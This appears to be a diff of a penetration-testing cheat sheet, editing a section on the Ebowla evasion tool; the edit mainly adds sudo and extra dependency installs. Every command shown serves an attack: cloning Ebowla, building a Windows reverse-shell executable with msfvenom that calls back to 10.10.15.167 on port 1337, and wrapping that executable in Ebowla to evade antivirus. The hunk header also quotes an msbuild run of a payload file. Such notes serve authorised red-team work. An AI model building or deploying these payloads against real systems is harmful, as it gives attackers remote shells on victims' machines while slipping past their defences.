@@ -653,9 +653,10 @@ PS> cmd /c C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe payload.xml
 ### Ebowla
 
 ```
-root@kali:$ git clone https://github.com/Genetic-Malware/Ebowla /opt/Ebowla && cd /opt/Ebowla
-root@kali:$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.167 LPORT=1337 --platform win -f exe -a x64 -o rev.exe
-root@kali:$ pip install configobj
+root@kali:$ sudo git clone https://github.com/Genetic-Malware/Ebowla /opt/Ebowla && cd /opt/Ebowla
+root@kali:$ sudo apt install golang wine -y
+root@kali:$ sudo python -m pip install configobj pyparsing pycrypto pyinstaller
+root@kali:$ sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.167 LPORT=1337 --platform win -f exe -a x64 -o rev.exe
 root@kali:$ vi genetic.config
 ...Edit output_type, payload_type, ENV_VAR...
 root@kali:$ python ebowla.py rev.exe genetic.config
